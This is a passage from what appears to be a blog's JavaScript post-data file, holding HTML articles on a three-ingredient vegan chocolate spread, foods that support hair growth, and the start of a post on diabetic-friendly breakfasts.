+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For a quick healthy dessert plate, serve the spread in a small bowl with strawberries, banana slices, apple wedges, and toasted coconut. It feels elegant, takes only minutes, and works beautifully for sharing.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Store Homemade Vegan Chocolate Spread</h2>
+
+<p>Because this homemade spread is made with whole ingredients and does not contain preservatives, proper storage is important. Keep it in a clean, airtight jar or container in the refrigerator. A glass jar works especially well because it keeps the flavor fresh and makes the spread easy to scoop.</p>
+
+<p>The texture may firm up slightly when chilled. If you prefer a softer consistency, let the jar sit at room temperature for a few minutes before serving. You can also stir in a tiny splash of warm water or plant-based milk if it becomes too thick after refrigeration.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Storage Tips</h3>
+
+<ul>
+  <li>Use a clean, dry spoon each time to keep the spread fresh.</li>
+  <li>Store in an airtight container in the refrigerator.</li>
+  <li>Let it soften briefly before spreading if it becomes firm.</li>
+  <li>Avoid adding too much liquid if you want it to last longer.</li>
+  <li>Make a smaller batch if you prefer the freshest flavor.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>Even a simple recipe can benefit from a few troubleshooting tips. If your vegan chocolate spread does not turn out exactly as expected the first time, it is usually easy to fix.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Using Dry Dates</h3>
+
+<p>Dry dates can make the spread grainy or difficult to blend. Soaking them in warm water helps soften the fibers and creates a smoother result. Just remember to drain them well before adding them to the blender.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Skipping the Toasting Step</h3>
+
+<p>Raw hazelnuts can still be used, but toasted hazelnuts create a deeper flavor. If you want that classic chocolate hazelnut taste, toasting is worth the extra few minutes.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Adding Too Much Liquid at Once</h3>
+
+<p>Liquid helps loosen the spread, but too much can make it thin. Add it slowly and blend between additions. A small amount can change the texture more than you might expect.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Not Blending Long Enough</h3>
+
+<p>If the spread looks crumbly or thick, it may simply need more time. Continue blending in short intervals and scrape down the sides. The hazelnuts need time to release their oils and become creamy.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why This Recipe Fits a Modern Healthy Lifestyle</h2>
+
+<p>Modern home cooking is all about recipes that are simple, flexible, and satisfying. This vegan chocolate spread fits that approach perfectly. It offers the comfort of a familiar chocolate treat while using a short, plant-based ingredient list.</p>
+
+<p>It also works well for meal prep. Make a jar at the start of the week and you have an easy topping ready for breakfasts and snacks. It can help make simple foods more exciting, especially fruit, toast, oats, and pancakes.</p>
+
+<p>Another benefit is customization. Store-bought spreads usually taste the same every time, but homemade versions can be adjusted. Want it darker? Add more cocoa. Want it creamier? Blend longer or add a splash of plant milk. Want it sweeter? Use softer, sweeter dates or add a tiny drizzle of maple syrup.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Main flavor:</strong> Rich chocolate with roasted hazelnut notes</li>
+    <li><strong>Texture:</strong> Thick, creamy, glossy, and spreadable</li>
+    <li><strong>Sweetener:</strong> Naturally sweet dates</li>
+    <li><strong>Best uses:</strong> Toast, pancakes, oatmeal, fruit, and desserts</li>
+    <li><strong>Diet-friendly angle:</strong> Vegan, dairy-free, and homemade</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Simple Serving Combinations to Try</h2>
+
+<p>If you want to make the most of your homemade vegan chocolate spread, pair it with ingredients that complement its natural sweetness and nutty cocoa flavor. Fresh fruit, toasted bread, crunchy toppings, and warm breakfast foods all work beautifully.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Sweet Breakfast Pairing</h4>
+
+<p>Spread it over whole grain toast, add sliced banana, and finish with a sprinkle of chopped hazelnuts. This combination gives you soft, creamy, crunchy, and sweet all in one bite.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Fruit Dip Plate</h4>
+
+<p>Spoon the spread into a small bowl and serve it with strawberries, apples, pears, and orange slices. The chocolate flavor pairs especially well with bright, juicy fruit.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Oatmeal Upgrade</h4>
+
+<p>Stir a spoonful into warm oatmeal and top with berries, seeds, or coconut flakes. The heat softens the spread and creates a chocolatey swirl throughout the bowl.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Creamy Vegan Chocolate Spread Worth Making</h2>
+
+<p>A 3-ingredient vegan chocolate spread proves that homemade treats do not need to be complicated. With dates, cocoa powder, and hazelnuts, you can make a creamy, naturally sweet, dairy-free spread that tastes rich and satisfying. It is simple enough for everyday snacking, yet special enough to serve with pancakes, fruit boards, desserts, and cozy weekend breakfasts.</p>
+
+<p>The key is to use soft dates, flavorful cocoa powder, and well-blended hazelnuts. Once you master the basic method, you can customize the flavor, texture, and sweetness to suit your own kitchen. Keep a jar in the fridge, and you will always have a quick chocolatey topping ready to make simple meals feel more delicious.</p>
+
+<p>For anyone looking for an easy vegan Nutella alternative, a wholesome chocolate hazelnut spread, or a naturally sweet treat made from pantry staples, this recipe is a beautiful place to start. It is creamy, chocolatey, dairy-free, and wonderfully simple.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vegan Chocolate Spread</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">3 Ingredient Recipe</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dairy-Free Dessert</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Homemade Nutella</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Chocolate Spread</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Date Sweetened</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hazelnut Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plant-Based Snacks</span>
+</div>
+
+                `
+            },
+            {
+                id: 'second-recipe-post',
+                title: '10 Foods That Help Hair Growth Naturally',
+                date: 'May 14, 2026',
+                image: './assets/10 Foods That Help Hair Growth Naturally.png',
+                excerpt: 'Healthy, strong, shiny hair often starts with what is happening on your plate. While hair care products can improve appearance and help with manageability, real hair support begins from within.',
+                content: `
+               <p>Healthy, strong, shiny hair often starts with what is happening on your plate. While hair care products can improve appearance and help with manageability, real hair support begins from within. A nutrient-rich diet gives your body the building blocks it needs to support the hair growth cycle, strengthen strands, and nourish the scalp. If you have been searching for practical, everyday ways to support healthier hair, focusing on food is one of the smartest places to begin.</p>
+
+<p>The good news is that hair-friendly eating does not have to be complicated. Many of the best foods for hair growth are familiar staples like eggs, spinach, berries, nuts, avocado, salmon, sweet potato, flaxseeds, Greek yogurt, and pumpkin seeds. These ingredients offer a mix of protein, healthy fats, iron, antioxidants, zinc, biotin, and other nutrients that are often associated with healthy hair and scalp support.</p>
+
+<p>This guide explores 10 foods that help hair growth, why they matter, and how to work them into your routine. It also covers lifestyle habits that complement a healthy diet, so you can build a well-rounded, realistic approach to stronger, happier hair over time.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Hair growth is supported by a balanced diet rich in protein, iron, healthy fats, zinc, antioxidants, and vitamins.</li>
+    <li>Eggs, spinach, berries, nuts, avocado, salmon, sweet potato, flaxseeds, Greek yogurt, and pumpkin seeds are excellent foods for healthy hair.</li>
+    <li>Hydration, sleep, scalp care, and avoiding excessive heat styling can help protect hair quality and support growth goals.</li>
+    <li>Consistency matters more than quick fixes when it comes to nutrition for hair growth.</li>
+    <li>A healthy scalp and nutrient-dense meals work together to create a better environment for stronger strands.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Nutrition Plays Such a Big Role in Hair Growth</h2>
+
+<p>Hair is made largely of protein, and it grows through a cycle that depends on your body having enough energy and nutrients to maintain the process. When your diet is balanced and varied, your body is better equipped to support healthy follicles, scalp condition, and strand strength. On the other hand, a diet lacking in key nutrients may leave hair feeling weaker, drier, or more prone to breakage.</p>
+
+<p>That does not mean there is one magic ingredient that changes everything overnight. Hair health is usually the result of many small habits done consistently. Eating enough protein, including healthy fats, staying hydrated, and getting vitamins and minerals from whole foods all help create a stronger foundation for healthier hair.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Hair growth support is rarely about a single superfood. The real power comes from combining nutrient-rich foods regularly and pairing them with healthy habits such as hydration, sleep, and gentle hair care.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">10 Foods That Help Hair Growth</h2>
+
+<p>If you want to build a more hair-friendly diet, these foods are a great starting point. Each one contributes something slightly different, which is why variety matters.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Eggs</h3>
+
+<p>Eggs are one of the most popular foods associated with stronger hair, and for good reason. They are rich in protein and also provide biotin, both of which are commonly linked to hair support. Since hair strands are largely made of protein, regular intake of protein-rich foods can help support hair structure and strength.</p>
+
+<p>Eggs are also versatile and easy to add to a daily routine. Whether you enjoy them boiled, scrambled, poached, or added to salads and grain bowls, they offer a practical way to include hair-friendly nutrients at breakfast or lunch.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Spinach</h3>
+
+<p>Spinach is a nutrient-dense leafy green that is often valued for its iron and vitamin content. Iron is especially important because it helps support the transport of oxygen throughout the body, including to the cells involved in hair growth. Spinach also contributes a range of beneficial nutrients that support overall wellness.</p>
+
+<p>You can add spinach to omelets, smoothies, soups, pasta dishes, and salads. It is one of the easiest ways to increase your intake of greens without having to overhaul your meals completely.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Berries</h3>
+
+<p>Berries are colorful, refreshing, and packed with antioxidants. These compounds help protect the body from oxidative stress, which is one reason berries are often included in wellness-focused diets. They also bring vitamin-rich support that fits beautifully into a hair-healthy eating plan.</p>
+
+<p>Strawberries, blueberries, raspberries, and blackberries are easy additions to yogurt bowls, oatmeal, smoothies, or snacks. Their bright flavor makes healthy eating feel more enjoyable, which is always a plus when building sustainable habits.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Nuts</h3>
+
+<p>Nuts offer a combination of healthy fats, minerals, and satisfying texture. Many nuts, including almonds and walnuts, are associated with scalp nourishment because they provide nutrients such as zinc and omega fats that support overall hair and skin health.</p>
+
+<p>A small handful of nuts can make a smart snack, but they also work well sprinkled over salads, oatmeal, or yogurt. Including nuts regularly can help make meals more filling while adding important nutrients to your day.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Avocado</h3>
+
+<p>Avocado is rich in healthy fats and known for its creamy texture and satisfying flavor. Healthy fats help support the scalp and can play a role in maintaining moisture and softness. Avocado is also a great ingredient for balanced meals because it pairs well with both savory and fresh dishes.</p>
+
+<p>Use avocado on toast, in salads, blended into smoothies, or sliced into wraps and grain bowls. It adds richness without much effort and can help create meals that feel both nourishing and satisfying.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Salmon</h3>
+
+<p>Salmon is widely appreciated for its omega-3 fatty acids, which are often associated with scalp support and hair thickness. It also provides protein, making it a strong all-around option for a hair-supportive diet. For many people, salmon is one of the most effective ways to include both healthy fats and protein in a single meal.</p>
+
+<p>Try baked salmon with vegetables, salmon bowls with rice, or flaked salmon added to salads. Even one or two salmon meals a week can be a practical way to diversify your nutrient intake.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Sweet Potato</h3>
+
+<p>Sweet potatoes are often praised for their beta-carotene content. This nutrient is well known in wellness conversations related to skin and hair support. Sweet potatoes are also comforting, affordable, and easy to cook, which makes them a practical addition to weekly meal planning.</p>
+
+<p>Roast them as wedges, mash them as a side dish, or cube them into sheet pan dinners. Their natural sweetness and versatility make them appealing even for people who are not big vegetable fans.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Flaxseeds</h3>
+
+<p>Flaxseeds may be tiny, but they bring valuable nutritional benefits. They are often highlighted for their omega-3s and lignans, making them a smart ingredient in a diet designed to support hair strength. Because they are easy to add to everyday meals, flaxseeds are a small habit with a lot of potential value.</p>
+
+<p>Stir ground flaxseeds into oatmeal, smoothies, pancake batter, or yogurt. They can also be sprinkled onto cereal or mixed into homemade energy bites for a subtle nutrition boost.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Greek Yogurt</h3>
+
+<p>Greek yogurt is another protein-rich choice that fits naturally into a hair health routine. It is also commonly appreciated for probiotics, which support overall digestive wellness. A balanced gut and balanced eating pattern often go hand in hand, and Greek yogurt can be an easy part of that routine.</p>
+
+<p>Enjoy it with berries, use it in smoothies, or turn it into a savory dip. If you prefer a lighter sweet snack, Greek yogurt topped with seeds and fruit is a simple combination that supports several hair-friendly goals at once.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Pumpkin Seeds</h3>
+
+<p>Pumpkin seeds are rich in nutrients often linked to hair wellness, including zinc, iron, and biotin. They are also easy to keep on hand and require no cooking, which makes them ideal for busy schedules. A tablespoon or two can go a long way when it comes to adding texture and nutrition to meals.</p>
+
+<p>Sprinkle pumpkin seeds over salads, soups, yogurt, or oatmeal. They also make a satisfying snack on their own and are a convenient way to boost nutrient density throughout the day.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Hair-friendly foods work best when you eat them consistently, not occasionally.</li>
+    <li>Combining protein, healthy fats, and colorful plant foods gives your body broader nutritional support.</li>
+    <li>Building meals around real food is often more sustainable than chasing trendy quick fixes.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Turn These Foods Into a Hair-Healthy Eating Routine</h2>
+
+<p>Knowing which foods support hair growth is helpful, but using them consistently is where results become more realistic. A good strategy is to spread these ingredients across your day rather than trying to eat them all at once.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Simple Meal Ideas</h3>
+
+<ul>
+  <li><strong>Breakfast:</strong> Greek yogurt topped with berries, flaxseeds, and pumpkin seeds.</li>
+  <li><strong>Lunch:</strong> Spinach salad with avocado, boiled eggs, nuts, and a light dressing.</li>
+  <li><strong>Dinner:</strong> Baked salmon with roasted sweet potato and sautéed spinach.</li>
+  <li><strong>Snack:</strong> A handful of mixed nuts or sliced fruit with yogurt.</li>
+</ul>
+
+<p>This kind of approach makes the diet feel balanced and realistic. It also helps you enjoy the benefits of variety, which is important because no single food provides everything your hair may need.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Build a “hair health plate” by combining one protein source, one colorful fruit or vegetable, and one healthy fat at each meal. This simple pattern makes it much easier to eat in a way that supports healthy hair without overthinking every ingredient.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Extra Tips for Healthy Hair Beyond Food</h2>
+
+<p>Nutrition is a major part of the picture, but it is not the only part. Daily habits can influence how your hair looks, feels, and responds over time. A well-rounded hair wellness routine includes care for both the inside and the outside.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Drink Plenty of Water</h3>
+
+<p>Hydration supports your whole body, including the scalp. When you are well hydrated, your skin and scalp are generally better supported, and your overall wellness routine tends to work better. Keep water nearby throughout the day and look for simple ways to make hydration more consistent.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Get Enough Sleep</h3>
+
+<p>Sleep is an essential part of recovery and wellness. Your body does much of its restoration work during restful sleep, so a strong sleep routine can support many areas of health, including those related to hair. Late nights and chronic fatigue can affect overall balance in ways that may show up in your skin, energy, and hair.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Avoid Excessive Heat Styling</h3>
+
+<p>Too much heat can weaken the look and feel of hair, making breakage more likely. Even if your roots are healthy, over-styling can make lengths appear thinner or rougher than they really are. Reducing heat exposure and using gentler styling methods can help preserve the strength of your strands.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Try Gentle Scalp Massage</h3>
+
+<p>Scalp massage is a simple self-care habit that many people enjoy. It can help you become more intentional about scalp care and create a relaxing daily ritual. Whether you use your fingertips or a scalp tool, keeping the process gentle is key.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Be Patient and Stay Consistent</h3>
+
+<p>Hair changes take time. A healthy eating routine usually does not transform your hair in a weekend. The most meaningful improvements often come from consistent habits repeated over weeks and months. That is why patience matters just as much as the foods themselves.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> If you are eating well but still noticing significant hair shedding, sudden thinning, or scalp issues, it may be worth speaking with a healthcare professional. Diet is powerful, but hair concerns can sometimes have other underlying causes.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Food Combinations for Stronger, Happier Hair</h2>
+
+<p>Combining several hair-supportive foods in one meal can help you cover more nutritional ground while keeping meals interesting. Instead of focusing on isolated ingredients, think in terms of combinations that make sense in daily life.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Breakfast Bowl</h4>
+
+<p>Greek yogurt, berries, flaxseeds, and pumpkin seeds create a protein-rich, antioxidant-packed breakfast that is quick, colorful, and easy to repeat during the week.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Hair-Friendly Lunch Salad</h4>
+
+<p>A spinach salad topped with avocado, eggs, and nuts delivers healthy fats, protein, and greens in one satisfying meal. Add a piece of fruit on the side for even more variety.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Balanced Dinner Plate</h4>
+
+<p>Salmon, roasted sweet potato, and sautéed spinach make a strong dinner choice when you want something nourishing and comforting. It is a simple combination that supports healthy eating without being complicated.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What to Remember About Hair Growth and Results</h2>
+
+<p>It is natural to want quick changes, especially when you are putting effort into eating better and caring for your hair. Still, hair health is usually a long game. The goal is not perfection. The goal is to create a steady routine that supports your body over time.</p>
+
+<p>That means thinking beyond one meal or one week. A bowl of berries today or a serving of salmon tonight is helpful, but the bigger win is creating a lifestyle where nutrient-dense foods show up often. Small choices like swapping a low-nutrient snack for nuts, adding spinach to lunch, or drinking more water can build meaningful momentum.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prioritize protein-rich foods like eggs, salmon, and Greek yogurt.</li>
+    <li>Add nutrient-dense produce such as spinach, berries, avocado, and sweet potato.</li>
+    <li>Use nuts, flaxseeds, and pumpkin seeds to boost healthy fats and minerals.</li>
+    <li>Support your routine with water, sleep, gentle scalp care, and less heat styling.</li>
+    <li>Stay consistent and give your body time to respond.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Healthy Foods, Healthy Hair</h2>
+
+<p>When it comes to supporting hair growth naturally, food is one of the most valuable tools you have. A diet that includes eggs, spinach, berries, nuts, avocado, salmon, sweet potato, flaxseeds, Greek yogurt, and pumpkin seeds can help provide the nutrients commonly associated with stronger hair and a healthier scalp. These are not extreme or difficult ingredients. They are everyday foods that can be combined in simple, satisfying ways.</p>
+
+<p>The real secret is consistency. Nourishing your hair from within works best when you repeat these habits over time and support them with hydration, sleep, gentle styling, and patience. If you focus on a balanced routine instead of a quick fix, you give your body a much better chance to support healthy, resilient hair naturally.</p>
+
+<p>Healthy foods can do more than improve your plate. They can help you feel better, care for yourself more intentionally, and support the kind of hair goals that begin with lasting wellness from the inside out.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Foods for Hair Growth</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Hair Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hair Growth Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Best Foods for Hair</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Scalp Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nutrition for Hair</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Lifestyle</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hair Wellness</span>
+</div>
+
+                `
+            },
+            {
+                id: 'my-third-post',
+                title: 'Diabetic Breakfast Ideas, Diabetes Breakfast',
+                date: 'June 16, 2026',
+                image: './assets/Diabetic Breakfast Ideas, Diabetes Breakfast.png',
+                excerpt: 'Building a satisfying breakfast can feel surprisingly simple when the right foods are placed front and center. A diabetic-friendly breakfast does not have to be bland, repetitive, or complicated. With a smart balance of protein, fiber, healthy fats, and colorful whole-food ingredients, the first meal of the day can feel fresh, filling, and genuinely enjoyable.',
+                content: `
+               <p>Building a satisfying breakfast can feel surprisingly simple when the right foods are placed front and center. A diabetic-friendly breakfast does not have to be bland, repetitive, or complicated. With a smart balance of protein, fiber, healthy fats, and colorful whole-food ingredients, the first meal of the day can feel fresh, filling, and genuinely enjoyable. The breakfast ideas featured here focus on approachable meals such as veggie egg muffins, Greek yogurt with berries and chia, avocado toast with poached egg, cottage cheese bowls, cinnamon oats, smoked salmon plates, peanut butter banana English muffins, and spinach omelets with tomatoes.</p>
+
+<p>These breakfast combinations are designed around a practical idea: choose foods that help support steadier mornings while still feeling delicious and realistic for everyday routines. Instead of relying on sugary pastries, sweetened cereals, or oversized portions of refined carbohydrates, these ideas highlight protein-rich ingredients, fiber-filled produce, nuts, seeds, eggs, yogurt, oats, vegetables, and whole grains. The result is a breakfast style that feels colorful, nourishing, and easy to adapt.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Diabetic-friendly breakfast ideas often work best when they combine protein, fiber, and healthy fats.</li>
+    <li>Eggs, Greek yogurt, cottage cheese, oats, salmon, nuts, seeds, and vegetables are excellent breakfast building blocks.</li>
+    <li>Whole grains and fruit can fit into balanced breakfasts when paired with protein and portion awareness.</li>
+    <li>Meal prep options like egg muffins and chia bowls make busy mornings easier.</li>
+    <li>Simple savory breakfasts can help reduce the need for added sugars early in the day.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Breakfast Balance Matters for Diabetic-Friendly Eating</h2>
+
+<p>A strong breakfast is not just about eating something quickly before the day begins. For people looking for diabetic breakfast ideas, the real goal is balance. Breakfast should provide lasting energy, help manage hunger, and avoid the sharp highs and lows that can come from meals built mostly around refined carbohydrates or added sugar.</p>
+
+<p>The best diabetic breakfast ideas usually include three key components: <strong>protein</strong>, <strong>fiber</strong>, and <strong>healthy fats</strong>. Protein helps with fullness and supports muscle maintenance. Fiber slows digestion and adds volume to the meal. Healthy fats, when used thoughtfully, can make breakfast more satisfying and flavorful.</p>
+
